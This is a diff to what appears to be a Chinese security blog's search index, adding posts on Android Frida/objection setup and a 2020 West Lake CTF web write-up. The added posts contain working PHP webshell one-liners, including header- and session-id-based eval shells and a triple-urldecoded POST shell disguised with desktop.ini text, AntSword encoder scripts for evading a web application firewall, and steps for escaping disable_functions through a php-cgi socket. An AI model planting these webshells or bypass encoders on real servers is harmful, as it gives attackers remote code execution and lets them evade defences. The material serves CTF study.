@@ -1205,7 +1205,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb -s 192.168.3.18:5555 shell</span><br></pre></td></tr></table></figure>
 
 <p>11、查看某端口对应的进程名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -tunlp |grep 7001  # 端口</span><br><span class="line">netstat -tunlp |grep &quot;com.termux&quot; # 进程名</span><br><span class="line">netstat -aple |grep -i https #正在通信的端口，查看使用https的通信</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -tunlp |grep 7001  # 端口</span><br><span class="line">netstat -tunlp |grep &quot;com.termux&quot; # 进程名</span><br><span class="line">netstat -aple |grep -i https #正在通信的端口，查看使用https的通信</span><br><span class="line">netstat -tuulp|grep  查看监听端口</span><br><span class="line">lsof -p + 进程ip|grep + TCP 查看监听端口</span><br></pre></td></tr></table></figure>
 
 <p>12、<code>htop</code>实时查看手机进程</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pkg install htop</span><br></pre></td></tr></table></figure>
@@ -1258,7 +1258,16 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原文：&lt;?php @eval($_GET(a)):?&gt;</span><br><span class="line">转码后：在提交的post的时候可以直接使用\u0026\u006c\u0074\u003b\u003f\u0070\u0068\u0070\u0020\u0040\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0047\u0045\u0054\u0028\u0061\u0029\u0029\u003a\u003f\u0026\u0067\u0074\u003b</span><br></pre></td></tr></table></figure>
 
 <p>(2)，蚁剑链接时编码</p>
-<p>蚁剑在getshell的时候，可以选取使用编码器和解码器，这个时候可以使用自己的独家编码器进行实际的操作，并进行花式绕过waf。</p>
+<p>蚁剑在getshell的时候，可以选取使用编码器和解码器，这个时候可以使用自己的独家编码器进行实际的操作，并进行花式绕过waf。蚁剑的编码器是采用的js语言进行编写的，简易操作。</p>
+<h2 id="二、花招大法"><a href="#二、花招大法" class="headerlink" title="二、花招大法"></a>二、花招大法</h2><p>(1).通过getallheaders()来获取shell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	echo 1;</span><br><span class="line">	print(pos(getallheaders()));</span><br><span class="line">	eval(pos(getallheaders()));</span><br><span class="line">	?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/10/11/XsqMTPCSbgWezav.png"></p>
+<p>这样配置，密码是1；</p>
+<p>(2)同理可以使用sessionid来操作，同时搭配编码器，这就很舒服了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php eval(hex2bin(session_id(session_start())));?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里的hex2bin可以改为base64</p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -1326,7 +1335,20 @@ php_value include_path &quot;+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compil
   <entry>
     <title>安卓之旅-3</title>
     <url>/2020/10/09/%E5%AE%89%E5%8D%93%E4%B9%8B%E6%97%85-3/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<h2 id="安卓之旅-3"><a href="#安卓之旅-3" class="headerlink" title="安卓之旅-3"></a>安卓之旅-3</h2><h3 id="一、解决软件会自动断掉USB链接的设置"><a href="#一、解决软件会自动断掉USB链接的设置" class="headerlink" title="一、解决软件会自动断掉USB链接的设置"></a>一、解决软件会自动断掉USB链接的设置</h3><p>在手机上使用termux,开启frida，监听0.0.0.0:8888端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;frida-** -l 0.0.0.0:8888</span><br></pre></td></tr></table></figure>
+
+<p>就会在0.0.0.0的端口上进行监听，这里的0.0.0.0是通过该设备的所有流量都会被劫持，而127.0.0.1只有本地机器发出的流量才会被劫持。然后，在电脑上开启objection</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objection -N -h ip -p 端口 -g 包名 explore</span><br></pre></td></tr></table></figure>
+
+<p>使用下面的命令进行查看报名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frida -ps -H ip:端口 | grep shimeng</span><br></pre></td></tr></table></figure>
+
+<p>-h是适应网络链接，-u是使用usb链接</p>
+]]></content>
+      <tags>
+        <tag>Android</tag>
+      </tags>
   </entry>
   <entry>
     <title>西湖丢脸大赛</title>
@@ -1347,7 +1369,7 @@ php_value include_path &quot;+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compil
 <p><img src="https://wulidecade.cn/2020/10/08/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web-wp/1.png" alt="img"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">**</span><br><span class="line"> * php::base64编码器</span><br><span class="line"> * Create at: 2020&#x2F;10&#x2F;08 11:54:20</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">* @param  &#123;String&#125; pwd   连接密码</span><br><span class="line">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span><br><span class="line">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span><br><span class="line">*&#x2F;</span><br><span class="line">module.exports &#x3D; (pwd, data, ext&#x3D;&#123;&#125;) &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F; ##########    请在下方编写你自己的代码   ###################</span><br><span class="line">  &#x2F;&#x2F; 以下代码为 PHP Base64 样例</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 生成一个随机变量名</span><br><span class="line">  let randomID &#x3D; &#96;_0x$&#123;Math.random().toString(16).substr(2)&#125;&#96;;</span><br><span class="line">  &#x2F;&#x2F; 原有的 payload 在 data[&#39;_&#39;]中</span><br><span class="line">  &#x2F;&#x2F; 取出来之后，转为 base64 编码并放入 randomID key 下</span><br><span class="line">  data[randomID] &#x3D; Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span><br><span class="line">  data[pwd] &#x3D; data[randomID];</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; ##########    请在上方编写你自己的代码   ###################</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 删除 _ 原有的payload</span><br><span class="line">  delete data[&#39;_&#39;];</span><br><span class="line">  &#x2F;&#x2F; 返回编码器处理后的 payload 数组</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>然后用蚂蚁进行链接就可以成功地getshell。这里同时我们也可以扩展一下，在我们的实际运用中，也可以将一些编码的函数在php马儿中打出来，这样我们在实际使用这些马儿的时候，将传输的数据进行编码，然后在马儿中进行编码就可以简单地绕过waf</p>
+<p>然后用蚂蚁进行链接就可以成功地getshell。这里同时我们也可以扩展一下，在我们的实际运用中，也可以将一些编码的函数在php马儿中打出来，这样我们在实际使用这些马儿的时候，将传输的数据进行编码，然后在马儿中进行编码就可以简单地绕过waf。</p>
 <p>最后这道题的实际思路如下:</p>
 <p>经过百度，宝塔的实际waf是用lua脚本写的，这一点在<a href="https://blog.csdn.net/zhuxiongyin/article/details/98174377%E8%BF%99%E4%B8%AA%E6%96%87%E7%AB%A0%E4%B8%AD%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9F%A5%E9%81%93%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%BF%99%E4%B8%AAapache%E7%8E%AF%E5%A2%83%E5%BF%85%E5%AE%9A%E6%94%AF%E6%8C%81lua%E6%A8%A1%E5%9D%97%EF%BC%8C%E8%BF%99%E6%A0%B7%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%BE%88%E7%AE%80%E5%8D%95%E5%9C%B0%E7%BB%95%E8%BF%87PHP%E7%9A%84disfunc%E7%9A%84%E9%99%90%E5%88%B6%E5%92%8C%E4%BB%A5%E5%8F%8Aopen_dir%E7%9A%84%E9%99%90%E5%88%B6%EF%BC%8C%E7%AE%80%E5%8D%95%E7%9A%84%E4%B8%80%E4%B8%AAlua%E8%84%9A%E6%9C%AC%E5%8D%B3%E5%8F%AF%E7%BB%95%E8%BF%87">https://blog.csdn.net/zhuxiongyin/article/details/98174377这个文章中就可以知道，所以我们这个apache环境必定支持lua模块，这样我们就可以很简单地绕过PHP的disfunc的限制和以及open_dir的限制，简单的一个lua脚本即可绕过</a></p>
 <p>exp如下:</p>
@@ -1360,9 +1382,38 @@ php_value include_path &quot;+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compil
 <p><a href="https://www.yuque.com/docs/share/ecb03c8b-300a-4146-9d30-3ce396a7bb1d#">https://www.yuque.com/docs/share/ecb03c8b-300a-4146-9d30-3ce396a7bb1d?#</a></p>
 <p><a href="https://wulidecade.cn/2020/10/08/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web-wp/#more">https://wulidecade.cn/2020/10/08/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web-wp/#more</a></p>
 </blockquote>
+<p>下面开始直接打，相关绕过方法，查看其他文档</p>
+<p>首先上传shell，先链接蚁剑（可参考Getshell大法文章)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ï¿½ï¿½ [.ShellClassInfo] LocalizedResourceName&#x3D;@%SystemRoot%\system32\shell32.dll,-21770 IconResource&#x3D;%SystemRoot%\system32\imageres.dll,-112 IconFile&#x3D;%SystemRoot%\system32\shell32.dll IconIndex&#x3D;-235</span><br><span class="line">&lt;?php</span><br><span class="line">@eval(urldecode(urldecode(urldecode($_POST[&#39;aa&#39;]))));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后配置对应的编码器</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * php::base64编码器</span><br><span class="line"> * Create at: 2020&#x2F;10&#x2F;12 17:16:57</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">* @param  &#123;String&#125; pwd   连接密码</span><br><span class="line">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span><br><span class="line">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span><br><span class="line">*&#x2F;</span><br><span class="line">module.exports &#x3D; (pwd, data, ext&#x3D;&#123;&#125;) &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F; ##########    请在下方编写你自己的代码   ###################</span><br><span class="line">  &#x2F;&#x2F; 以下代码为 PHP Base64 样例</span><br><span class="line">    function urlencode(e, r) &#123;</span><br><span class="line">            return ++r ? &quot;%&quot; + ([10] + e.charCodeAt().toString(16)).slice(-2) :</span><br><span class="line">            decodeURI(encodeURIComponent(e)).replace(&#x2F;[^]&#x2F;g, urlencode)</span><br><span class="line">        &#125;</span><br><span class="line">  &#x2F;&#x2F; 生成一个随机变量名</span><br><span class="line">  let randomID &#x3D; &#96;_0x$&#123;Math.random().toString(16).substr(2)&#125;&#96;;</span><br><span class="line">  &#x2F;&#x2F; 原有的 payload 在 data[&#39;_&#39;]中</span><br><span class="line">  &#x2F;&#x2F; 取出来之后，转为 base64 编码并放入 randomID key 下</span><br><span class="line">  data[randomID] &#x3D; Buffer.from(data[&#39;_&#39;]).toString();</span><br><span class="line">  data[pwd]&#x3D;urlencode(urlencode(data[randomID]));</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; ##########    请在上方编写你自己的代码   ###################</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 删除 _ 原有的payload</span><br><span class="line">  delete data[&#39;_&#39;];</span><br><span class="line">  delete data[randomID];</span><br><span class="line">  &#x2F;&#x2F; 返回编码器处理后的 payload 数组</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后进行链接</p>
+<p><img src="https://i.loli.net/2020/10/13/tZ5Ivf8cB9ghW6j.png"></p>
+<p><img src="https://i.loli.net/2020/10/13/PGwhDXiAzanNxKl.png"></p>
+<p><img src="https://i.loli.net/2020/10/13/HwRuAVvUSagdM3N.png"></p>
+<p>现在点击链接就可以连接成功。</p>
+<p>再添加这样一条数据</p>
+<p><img src="C:/Users/Crawler/AppData/Roaming/Typora/typora-user-images/image-20201013195737288.png"></p>
+<p>注意后面的php文件名，然后我们用刚才第一条数据进行绕过disfunc。（这里省略了一步查找sock，就是做题常识了）。这里我就直接给出来了<code>/tmp/php-cgi-74.sock</code></p>
+<p>如下图配置</p>
+<p><img src="https://i.loli.net/2020/10/13/L6iN3cxazEBWXKQ.png"></p>
+<p>把地址复制好，然后一直打。我一把嗦了</p>
+<p><img src="https://i.loli.net/2020/10/13/q7TiHIRFcoD1P9k.png"></p>
+<p>然后打开刚才那个链接，打开虚拟终端，执行命令</p>
+<p><img src="https://i.loli.net/2020/10/13/GJmXd2ROsNYqrou.png"></p>
+<p>注意有效期只有一分钟，没有干到时间就要重打，然后就是这里特别容易因为网络原因而打失败，建议大家多打几次，因为环境基本上都是满足的，一般是不应该出现打不通的情况的。</p>
+<p>这样就是时间过了</p>
+<p><img src="https://i.loli.net/2020/10/13/if7vo2clgp5EZGJ.png"></p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>绕过DisFunc小技巧</title>
+    <url>/2020/10/13/%E7%BB%95%E8%BF%87DisFunc%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
+    <content><![CDATA[]]></content>
   </entry>
 </search>
